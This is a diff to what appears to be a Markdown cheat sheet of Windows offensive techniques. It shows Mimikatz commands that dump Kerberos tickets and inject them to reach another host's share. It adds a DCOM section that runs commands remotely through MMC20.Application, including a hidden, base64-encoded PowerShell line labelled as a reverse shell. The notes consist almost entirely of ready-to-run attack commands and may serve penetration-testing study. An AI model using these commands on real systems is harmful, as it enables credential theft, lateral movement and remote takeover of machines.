@@ -117,12 +117,20 @@ PS > c:\path\to\mimikatz
 mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
 PS > dir *.kirbi # file with the tickets
-mimikatz # kerberos::ptt ticket_from_the_kirbi_file.kirbi
+mimikatz # kerberos::ptt name_of_the_kirbi_file_with_user2_tickets.kirbi
 PS > klist # lists the tickets, user2 should appear
 PS > ls \\host2\someshare # access granted
 ```
 
 ### DCOM
+
+In an elevated PowerShell:
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","targetIpAddress"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc", "7") # parameters are Command, Directory, Parameters, and WindowState
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e base64longreverseshellstring", "7")
+```
+Reference: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand
 
 ## Persistence
 
